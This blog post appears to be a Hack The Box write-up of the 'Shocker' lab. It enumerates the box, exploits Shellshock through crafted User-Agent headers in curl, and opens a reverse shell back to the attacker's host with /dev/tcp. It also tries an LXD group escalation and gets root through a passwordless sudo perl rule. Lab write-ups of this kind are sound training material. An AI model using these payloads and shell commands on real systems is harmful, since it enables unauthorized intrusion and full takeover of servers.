---
layout: post
title:  "Shocker Writeup - Hack The Box"
date:   2023-12-26
desc: "Shellshock Attack, LXD Group Abuse, Abusing Sudoers Privilege"
keywords: "HTB,eJPT,eWPT,Linux,ShellshockAttack,LXD Group Abuse,AbusingSudoers,Easy"
categories: [HTB]
tags: [HTB,eJPT,eWPT,Linux,ShellshockAttack,LXDAbuse,AbusingSudoers,Easy]
icon: icon-htb
---

> **Disclaimer:** The ***writeups*** that I do on the different machines that I try to vulnerate, cover all the actions that I perform, even those that could be considered wrong, I consider that they are an essential part of the **learning curve** to become a **good professional**. So it can become very extensive content, if you are looking for something more direct, you should look for another site, there are many and of higher quality and different resolutions, moreover, I advocate that it is part of learning to consult different sources, to obtain greater expertise.

The **Shocker** box from [Hack The Box](https://www.hackthebox.com/){:target="_blank"}, is categorized as **Easy**, it does not possess a very high complexity but one can stay with the concept of **Shellshock Attack** and also investigate how the vulnerability is exploited to also understand where is the misconfiguration or the technology that possesses the security bug.

<br/><br/>
<img src="{{ site.img_path }}/shocker_writeup/Shocker.png" width="100%" style="margin: 0 auto;display: block
; max-width: 400px;">
<br/><br/>

After deploying the box with **[htbExplorer](https://github.com/s4vitar/htbExplorer){:target="_blank"}**, I use the `nmap` tool to first, obtain the list of open ports on the machine I am going to attack and second, obtain the services and versions that present some kind of vulnerability that will allow me to access the machine. When I already have this last information I can search for the **Codename** on the Internet, it is possible that if I find different ones, it is a sign that **Containers** are being used. 

```bash
./htbExplorer -d Shocker
```

```bash
sudo nmap -sS --min-rate 5000 -p- --open -vvv -n -Pn 10.10.10.56 -oG allPorts
nmap -sCV -p80,2222 10.10.10.56 -oN targeted

cat targeted
# Apache httpd 2.4.18
# OpenSSH 7.2p2 Ubuntu 4ubuntu2.2
```

<br/>
<img src="{{ site.img_path }}/shocker_writeup/Shocker_00.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/shocker_writeup/Shocker_01.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/shocker_writeup/Shocker_02.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

In the web service exposed on port **80** I can't find much information about its technology with `whatweb`, from the terminal, nor with **[Wappalyzer](https://www.wappalyzer.com/){:target="_blank"}**, from the browser. Analyzing its source code, I can know that it is a page without functionalities or resources. There is only one image, which may have some kind of information, but with `exiftool` or `steghide` I do not see any leaked information or hidden content.

```bash
file bug.jpg
exiftool bug.jpg
steghide info bug.jpg
```

<br/>
<img src="{{ site.img_path }}/shocker_writeup/Shocker_03.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/shocker_writeup/Shocker_04.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/shocker_writeup/Shocker_05.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/shocker_writeup/Shocker_06.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

If with `wfuzz` I start listing by directories on the web server, the first time I find nothing. But many times it happens that if I don't add the **`/`** at the end of the **URL**, it doesn't find all the directory names in the dictionary I use. Once the **`/`** is added, `wfuzz` finds the path **/cgi-bin**, which is often susceptible to **Shellshock attack**. With `gobuster` I can use the **`--add-slash`** parameter so I don't have this problem. If I access from the browser it shows me the **403 Forbidden** response, which means that the resource exists but I do not have permissions to view it.

> A **[CGI-bin](https://www.techopedia.com/definition/5585/cgi-bin){:target="_blank"}** is a folder used to house scripts that will interact with a Web browser to provide functionality for a Web page or website. **Common Gateway Interface** (**CGI**) is a resource for accommodating the use of scripts in Web design. As scripts are sent from a server to a Web browser, the **CGI-bin** is often referenced in a url.

```bash
wfuzz -c --hc=404 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.10.10.56/FUZZ
wfuzz -c --hc=404 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt http://10.10.10.56/FUZZ

wfuzz -c --hc=404 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.10.10.56/FUZZ/
gobuster dir -u http://10.10.10.56 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt --add-slash
```

<br/>
<img src="{{ site.img_path }}/shocker_writeup/Shocker_07.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/shocker_writeup/Shocker_08.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/shocker_writeup/Shocker_09.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/shocker_writeup/Shocker_10.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

Before I continue searching through directories, I will try to find files. With `wfuzz` you can pass a dictionary of names and also concatenate the extension I want to search, after only a short time, I find one, if I access it from the browser it downloads it, but its content does not have great information, at least for me.

```bash
wfuzz -c --hc=404 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -z list,txt-html-bck-sh-bin http://10.10.10.56/cgi-bin/FUZZ.FUZ2Z

mv ~/Downloads/user.sh .
file user.sh
cat !$
```

<br/>
<img src="{{ site.img_path }}/shocker_writeup/Shocker_11.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/shocker_writeup/Shocker_12.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/shocker_writeup/Shocker_13.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

I'm going to check if the website is vulnerable to **Shellshock Attack**, first I'm going to turn to **HackTricks** great resource, **[CGI](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/cgi){:target="_blank"}**, to get all the information I need. I run the commands provided there but they don't work, I also notice that I am passing the **uri** incorrectly, after correcting this, `nmap` reports that the page is vulnerable. I can see the categories of the `nmap` **scripts**, to try to find in a manual way if the page is vulnerable, but I don't succeed.

> **ShellShock**: **Bash** can also be used to run commands passed to it by applications and it is this feature that the vulnerability affects. One type of command that can be sent to **Bash** allows environment variables to be set. Environment variables are dynamic, named values that affect the way processes are run on a computer. The vulnerability lies in the fact that an attacker can tack-on malicious code to the environment variable, which will run once the variable is received.

```bash
nmap 10.10.10.56 -p80 --script=http-shellshock --script-args uri=/cgi-bin/admin.cgi

curl -H 'User-Agent: () { :; }; echo "VULNERABLE TO SHELLSHOCK"' http://10.10.10.56/cgi-bin/user.sh 2>/dev/null| grep 'VULNERABLE'

nmap 10.10.10.56 -p80 --script=http-shellshock --script-args uri=/cgi-bin/user.sh

locate .nse | xargs grep categories | grep -oP '".*?"' | sort -u
nmap --script "exploit and vuln and intrusive" --script-args uri=/cgi-bin/user.sh -p80 10.10.10.56
```

<br/>
<img src="{{ site.img_path }}/shocker_writeup/Shocker_14.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/shocker_writeup/Shocker_15.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/shocker_writeup/Shocker_16.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

I can also capture the packets sent by `nmap`, when it checks the vulnerability, to analyze how it does it. With `tshark` I capture the packets and save them in a file, but I have permissions problems, so first I am going to create the file and then give it the necessary permissions to be able to write in it. With the help of the configurable parameters of `tshark` I can filter the information I got until I get to what I am interested in and observe how the `nmap` **script** checks the vulnerability and in which **Headers** it injects the malicious command.

```bash
nmap 10.10.10.56 -p80 --script=http-shellshock --script-args uri=/cgi-bin/user.sh

tshark -w Capture.cap -i tun0
# tshark: The file to which the capture would be saved ("Capture.cap") could not be opened: Permission denied.

touch Capture.cap
chmod o=rw Capture.cap

man tshark
```

> **`-w <outfile> | -`**: Write raw packet data to outfile or to the standard output if outfile is '-'.

> **`-i|--interface  <capture interface> | -`**: Set the name of the network interface or pipe to use for live packet capture.

> **`-r|--read-file  <infile>`**: Read packet data from infile, can be any supported capture file format (including gzipped files). It is possibleto use named pipes or stdin (-) here but only with certain (not compressed) capture file formats (in particular:those that can be read without seeking backwards).

> **`-Y|--display-filter  <displaY filter>`**: Cause the specified filter (which uses the syntax of read/display filters, rather than that of capture filters) to be applied before printing a decoded form of packets or writing packets to a file. Packets matching the filter are printed or written to file; packets that the matching packets depend upon (e.g., fragments), are not printed but are written to file; packets not matching the filter nor depended upon are discarded rather than being printed or written.

> **`-T  ek|fields|json|jsonraw|pdml|ps|psml|tabs|text`**: Set the format of the output when viewing decoded packet data.

> **`-e  <field>`**: Add a field to the list of fields to display if `-T ek|fields|json|pdml` is selected. This option can be used multiple times on the command line. At least one field must be provided if the -T fields option is selected. Column names may be used prefixed with "_ws.col."

```bash
nmap 10.10.10.56 -p80 --script=http-shellshock --script-args uri=/cgi-bin/user.sh
tshark -w Capture.cap -i tun0

tshark -r Capture.cap
tshark -r Capture.cap -Y "http" 2>/dev/null
tshark -r Capture.cap -Y "http" -T json 2>/dev/null
tshark -r Capture.cap -Y "http" -Tfields -e "tcp.payl
oad" 2>/dev/null
```

<br/>
<img src="{{ site.img_path }}/shocker_writeup/Shocker_17.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/shocker_writeup/Shocker_18.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/shocker_writeup/Shocker_19.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/shocker_writeup/Shocker_20.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/shocker_writeup/Shocker_21.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/shocker_writeup/Shocker_22.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

Now I can exploit the **Shellshock attack** and try to get an **RCE**, but in the first attempts it does not work. So I follow the advice of several people in the community, add one more **semicolon** (**;**), or use the absolute path of the binaries, and this way I achieve to execute commands on the victim machine. Then I can get a **Reverse Shell** using a **[pentestmonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet){:target="_blank"}**, I also do a console treatment and start enumerating the system, something important I find is that I belong to the **LXD** group, and there is a vulnerability to escalate privileges. Also I can already read the first flag.

If I search the Internet for **"shellshock attack how attackers"**, there is a **Shellshock Attack** research that explains in detail the vulnerability, **[Inside Shellshock: How hackers are using it to exploit systems](https://blog.cloudflare.com/inside-shellshock){:target="_blank"}**.

```bash
curl -H 'User-Agent: () { :; }; echo "VULNERABLE TO SHELLSHOCK"' http://10.10.10.56/cgi-bin/user.sh 2>/dev/null| grep 'VULNERABLE'
curl -H 'User-Agent: () { :; }; echo; echo "VULNERABLE TO SHELLSHOCK"' http://10.10.10.56/cgi-bin/user.sh 2>/dev/null| grep 'VULNERABLE'

curl -H 'User-Agent: () { :; }; echo; whoami' http://10.10.10.56/cgi-bin/user.sh
curl -H 'User-Agent: () { :; }; echo; /usr/bin/whoami' http://10.10.10.56/cgi-bin/user.sh
curl -H 'User-Agent: () { :; }; echo; /usr/bin/id' http://10.10.10.56/cgi-bin/user.sh
curl -H 'User-Agent: () { :; }; echo; /usr/bin/hostname' http://10.10.10.56/cgi-bin/user.sh

tcpdump -i tun0 icmp -n
curl -H 'User-Agent: () { :; }; echo; /usr/bin/ping -c 1 10.10.14.15' http://10.10.10.56/cgi-bin/user.sh
curl -H 'User-Agent: () { :; }; echo; /usr/bin/ping "-c 1 10.10.14.15"' http://10.10.10.56/cgi-bin/user.sh
curl -H 'User-Agent: () { :; }; echo; ping "-c 1 10.10.14.15"' http://10.10.10.56/cgi-bin/user.sh
curl -H 'User-Agent: () { :; }; echo; /usr/bin/bash "/usr/bin/ping -c 1 10.10.14.15"' http://10.10.10.56/cgi-bin/user.sh
curl -H 'User-Agent: () { :; }; echo; /usr/bin/bash "ping -c 1 10.10.14.15"' http://10.10.10.56/cgi-bin/user.sh
curl -H 'User-Agent: () { :; }; echo; /bin/bash "ping -c 1 10.10.14.15"' http://10.10.10.56/cgi-bin/user.sh
curl -H 'User-Agent: () { :; }; echo; /bin/bash -c "ping -c 1 10.10.14.15"' http://10.10.10.56/cgi-bin/user.sh

nc -nlvp 443
curl -H 'User-Agent: () { :; }; echo; /bin/bash -c "bash -i >&/dev/tcp/10.10.14.15/443 0>&1"' http://10.10.10.56/cgi-bin/user.sh
```

> **Victime Machine**:

```bash
whoami
hostname
hostname -I

script /dev/null -c bash        # [Ctrl^Z]
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
stty rows 29 columns 128

id
groups
```

<br/>
<img src="{{ site.img_path }}/shocker_writeup/Shocker_23.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/shocker_writeup/Shocker_24.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/shocker_writeup/Shocker_25.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/shocker_writeup/Shocker_26.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/shocker_writeup/Shocker_27.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

I'm going to turn again to **HackTricks**, and one of their research **[lxd/lxc Group - Privilege escalation](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation){:target="_blank"}** explains the vulnerability to me. With `searchsploit` I find an exploit of **S4vitar** and **vowkin** that automates the whole attack, I just have to download a **Docker** image and then build it, in this container will create a volume of the system of the victim machine so that I can modify those files that allow me to escalate privileges.

```bash
searchsploit lxd
searchsploit -x linux/local/46978.sh

sudo su
mv 46978.sh lxd_exploit.sh
cat lxd_exploit.sh

wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine
chmod +x build-alpine
./build-alpine
```

<br/>
<img src="{{ site.img_path }}/shocker_writeup/Shocker_28.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/shocker_writeup/Shocker_29.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/shocker_writeup/Shocker_30.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/shocker_writeup/Shocker_31.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

Before transferring the exploit and the container to the victim machine, the creators of the script recommend making a modification to the script to avoid a permissions issue. After transferring the files and giving the exploit permission to run, I run it but get a permission problem.

> **Attacker Machine**:

```bash
nvim lxd_exploit.sh
# Delete
# && lxd init --auto

python3 -m http.server 80
```

> **Victime Machine**:

```bash
cd /dev/shm
wget 10.10.14.15/lxd_exploit.sh
chmod +x lxd_exploit.sh
wget 10.10.14.15/alpine-v3.19-x86_64-20231226_1430.tar.gz

./lxd_exploit.sh -f alpine-v3.19-x86_64-20231226_1430.tar.gz
# :( :(
```

<br/>
<img src="{{ site.img_path }}/shocker_writeup/Shocker_32.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/shocker_writeup/Shocker_33.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/shocker_writeup/Shocker_34.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/shocker_writeup/Shocker_35.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

I even try to convert the script to **Unix** format with `dos2unix` and transfer it back to the victim machine, but it still doesn't work. Maybe it's problems in the directory I chose to host the exploit, but if I go to another one that wouldn't present that problem, **tmp**, it doesn't work either. I will look for another attack vector.

> **Attacker Machine**:

```bash
dos2unix lxd_exploit.sh
python3 -m http.server 80
```

> **Victime Machine**:

```bash
wget 10.10.14.15/lxd_exploit.sh
chmod +x lxd_exploit.sh

./lxd_exploit.sh -f alpine-v3.19-x86_64-20231226_1430.tar.gz        # :(

cd /tmp
./lxd_exploit.sh -f alpine-v3.19-x86_64-20231226_1430.tar.gz        # :(
```

<br/>
<img src="{{ site.img_path }}/shocker_writeup/Shocker_36.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/shocker_writeup/Shocker_37.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

I continue to enumerate the box and find a special permission for the user `shelly`, she can run the `perl` binary as the `root` user without entering the password. On the **[GTFObins](https://gtfobins.github.io/gtfobins/perl/#sudo){:target="_blank"}** website I find the command I need to escalate privileges and I was able to rooted the box.

```bash
find \-perm -4000 2>/dev/null
ls -l ./usr/bin/pkexec
# -rwsr-xr-x 1 root root 23376 Jan 17  2016 ./usr/bin/pkexec

getcap -r / 2>/dev/null
sudo -l
# (root) NOPASSWD: /usr/bin/perl

sudo perl -e 'exec "/bin/sh";'
```

<br/>
<img src="{{ site.img_path }}/shocker_writeup/Shocker_38.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/shocker_writeup/Shocker_39.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/shocker_writeup/Shocker_40.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

> It's not one of the most complicated boxes in **Hack The Box**, but as I always say, you have to keep as much as you can learn and even try different attack vectors and take advantage of the machine to try other things. I have to kill the machine with **htbExplorer** and move on to the next lab.

```bash
./htbExplorer -k Shocker
```
